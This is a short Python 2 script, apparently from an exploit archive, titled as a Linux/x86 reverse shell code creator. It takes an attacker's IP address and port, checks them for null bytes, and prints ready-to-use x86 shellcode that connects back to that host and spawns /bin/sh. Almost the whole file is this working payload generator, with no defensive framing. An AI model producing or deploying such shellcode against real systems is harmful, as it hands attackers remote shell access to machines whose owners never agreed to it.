#!/usr/bin/python
# Title: Linux/x86 Reverse Shell code creator
# Author: Zsolt Agoston (agzsolt)
# Website: http://x86net.com
                
import sys

if len(sys.argv)<3:
        print "Usage: "+sys.argv[0]+" [target ip address] [port number]"
        exit()

ipaddr = str(sys.argv[1])
f_ipbyte = int(ipaddr.split('.')[0])
s_ipbyte = int(ipaddr.split('.')[1])
t_ipbyte = int(ipaddr.split('.')[2])
fo_ipbyte = int(ipaddr.split('.')[3])

if f_ipbyte<1 or f_ipbyte>255 or s_ipbyte<1 or s_ipbyte>255 or t_ipbyte<1 or t_ipbyte>255 or fo_ipbyte<1 or fo_ipbyte>255:
        print "[!] Octets can't be less then 1 or larger then 255"
        exit()

hexfbyte = hex(f_ipbyte)[2:].zfill(2)
hexsbyte = hex(s_ipbyte)[2:].zfill(2)
hextbyte = hex(t_ipbyte)[2:].zfill(2)
hexfobyte = hex(fo_ipbyte)[2:].zfill(2)

port = int(sys.argv[2])

if port>65535 or port<1:
        print "[!] Port value must be between 1 and 65535!"
        exit()

hexport = hex(port)[2:].zfill(4)        # if the value is shorter than 4 chars, it inserts leading 0-s

fbyte = hexport[0:2]                    # put first byte of port in fbyte, second byte on sbyte
sbyte = hexport[2:4]

if fbyte == "00" or sbyte == "00":
        print "Port value in hex contains a zero byte which is not permitted!"
        exit()
print "\033[1;36m\nReverse shell to " + ipaddr + " on port tcp/" + str(port) + "\033[1;m\n"

shellcode = (
"\\x6a\\x66\\x58\\x31\\xd2\\x52\\x42\\x52\\x89\\xd3\\x42\\x52\\x89\\xe1\\xcd\\x80"+
"\\x89\\xc3\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x87\\xda\\x68\033[1;32m\\x"+hexfbyte+"\\x"+hexsbyte+
"\\x"+hextbyte+"\\x"+hexfobyte+"\033[1;m\\x66\\x68\033[1;32m\\x"+fbyte+"\\x"+sbyte+"\033[1;m\\x66\\x53\\x89\\xe1\\xb0\\x66\\x43\\x6a\\x10\\x51"+
"\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x0b\\x99\\x89\\xd1\\x52\\x68\\x6e\\x2f\\x73\\x68"+
"\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xcd\\x80")

print "Shellcode:\n\n\"" + shellcode + "\"\n\n"
